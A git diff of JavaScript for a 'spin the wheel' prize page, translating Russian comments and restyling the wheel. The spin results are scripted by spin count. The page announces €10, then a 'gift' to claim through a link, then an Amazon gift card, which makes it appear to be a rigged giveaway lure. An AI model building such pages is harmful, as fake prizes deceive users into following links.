@@ -30,7 +30,7 @@ document.addEventListener("DOMContentLoaded", () => {
     rotatingTextContainer.style.fontSize = '12px';
     rotatingTextContainer.style.overflow = 'hidden';
     rotatingTextContainer.style.height = '30px';
-    rotatingTextContainer.style.whiteSpace = 'nowrap'; // Предотвращаем перенос текста
+    rotatingTextContainer.style.whiteSpace = 'nowrap'; // Prevent text wrapping
     document.body.appendChild(rotatingTextContainer);
 
     const rotatingMessages = [
@@ -43,15 +43,13 @@ document.addEventListener("DOMContentLoaded", () => {
     let currentMessageIndex = 0;
 
     function adjustRotatingTextPosition() {
-        const isMobile = window.innerWidth <= 768; // Проверяем мобильное устройство
-        rotatingTextContainer.style.top = isMobile ? '5%' : '10%'; // На мобильных текст чуть ниже
-        rotatingTextContainer.style.fontSize = isMobile ? '1rem' : '1.2rem'; // Размер текста подстраивается
+        const isMobile = window.innerWidth <= 768; // Check if device is mobile
+        rotatingTextContainer.style.top = isMobile ? '5%' : '10%'; // Lower text slightly on mobile
+        rotatingTextContainer.style.fontSize = isMobile ? '1rem' : '1.2rem'; // Adjust font size
     }
     
-    window.addEventListener('resize', adjustRotatingTextPosition); // Применяем изменения при изменении размера окна
-    adjustRotatingTextPosition(); // Первоначальная настройка
-
-
+    window.addEventListener('resize', adjustRotatingTextPosition); // Apply changes on window resize
+    adjustRotatingTextPosition(); // Initial setup
 
     // Function to rotate displayed text messages
     function rotateText() {
@@ -68,7 +66,6 @@ document.addEventListener("DOMContentLoaded", () => {
         currentMessage.style.transition = 'top 1s';
         rotatingTextContainer.appendChild(currentMessage);
         
-
         const nextMessageIndex = (currentMessageIndex + 1) % rotatingMessages.length;
         const nextMessage = document.createElement('div');
         nextMessage.textContent = rotatingMessages[nextMessageIndex];
@@ -107,8 +104,17 @@ document.addEventListener("DOMContentLoaded", () => {
     // Draws the wheel with segments and colors
     function drawWheel() {
         const radius = canvas.width / 2;
-        const segments = ["€5", "€10", "€15", "€20", "Gift Card", "Spotify", "Nike", "Amazon"];
-        const colors = ["#FF5733", "#33FF57", "#3357FF", "#FF33A6", "#FFFF33", "#FF5733", "#33FF57", "#FF33A6"];
+        const segments = [
+            { type: "text",  value: "Не повезло" },
+            { type: "text", value: "€10" },
+            { type: "image", value: "amazon.png" },
+            { type: "text", value: "€20" },
+            { type: "text", value: "Spotify" },
+            { type: "image", value: "amazon.png" },
+            { type: "text", value: "Не повезло" },
+            { type: "text", value: "Amazon" }
+        ];
+        const colors = ["#1D304F", "#4F74B2", "#1D304F", "#4F74B2", "#1D304F", "#4F74B2", "#1D304F", "#B00000"];
         const segmentAngle = (2 * Math.PI) / segments.length;
 
         for (let i = 0; i < segments.length; i++) {
@@ -118,20 +124,30 @@ document.addEventListener("DOMContentLoaded", () => {
             ctx.arc(radius, radius, radius, i * segmentAngle, (i + 1) * segmentAngle);
             ctx.lineTo(radius, radius);
             ctx.fill();
-            ctx.strokeStyle = "red";
-            ctx.lineWidth = 1;
+            ctx.strokeStyle = "#ffd700";
+            ctx.lineWidth = 5;
             ctx.stroke();
-
             ctx.save();
             ctx.translate(radius, radius);
             ctx.rotate(i * segmentAngle + segmentAngle / 2);
-            ctx.textAlign = "right";
-            ctx.fillStyle = "#fff";
-            ctx.font = "bold 14px Arial";
-            ctx.fillText(segments[i], radius - 20, 10);
+            ctx.textAlign = "center";
+
+            if (segments[i].type === "text") {
+                const fontSize = Math.max(14, Math.floor(canvas.width * 0.03)); // Adjust font size dynamically
+                ctx.fillStyle = "#fff";
+                ctx.font = `bold ${fontSize}px Arial`;
+                ctx.fillText(segments[i].value, 0, -radius * 0.7); // Move text closer to center
+            } else if (segments[i].type === "image") {
+                const img = new Image();
+                img.src = segments[i].value;
+                img.onload = () => {
+                    ctx.drawImage(img, -radius * 0.15, -radius * 0.6, radius * 0.3, radius * 0.3); // Adjust image position closer to center
+                };
+            }
             ctx.restore();
         }
     }
+
 
     // Spins the wheel and animates the rotation
     function spinWheel() {
@@ -182,25 +198,27 @@ document.addEventListener("DOMContentLoaded", () => {
 
 
     function adjustCanvasSize() {
-        const isMobile = window.innerWidth <= 768; // Условие для мобильных устройств
-        const canvasSize = isMobile ? Math.min(window.innerWidth, window.innerHeight) * 0.8 : 500; // 80% ширины экрана для мобильных
+        const isMobile = window.innerWidth <= 768; // Mobile device condition
+        const canvasSize = isMobile ? Math.min(window.innerWidth, window.innerHeight) * 0.8 : 500; // 80% of screen width for mobile
     
         canvas.width = canvasSize;
         canvas.height = canvasSize;
     
-        drawWheel(); // Перерисовка колеса с новыми размерами
+        drawWheel(); // Redraw the wheel with new sizes
     }
     
-    window.addEventListener('resize', adjustCanvasSize); // Обновление размера при изменении размеров окна
-    adjustCanvasSize(); // Первоначальная настройка размера
+    window.addEventListener('resize', adjustCanvasSize); // Update size on window resize
+    adjustCanvasSize(); // Initial size setup
     
 
     // Handle the outcome of a spin
     function handleSpinResult() {
         spinCount++;
 
-        if (spinCount === 1 || spinCount === 2) {
-            showSimplePopup(`Popup text for spin ${spinCount}`);
+        if (spinCount === 1) {
+            showSimplePopup("Вы выиграли €10! Поздравляем!");
+        } else if (spinCount === 2) {
+            showSimplePopup("Вы выиграли подарок! Пройдите по ссылке для получения.");
         } else if (spinCount === 3) {
             prizeName.textContent = "Amazon Gift Card";
             popup.classList.remove('hidden');
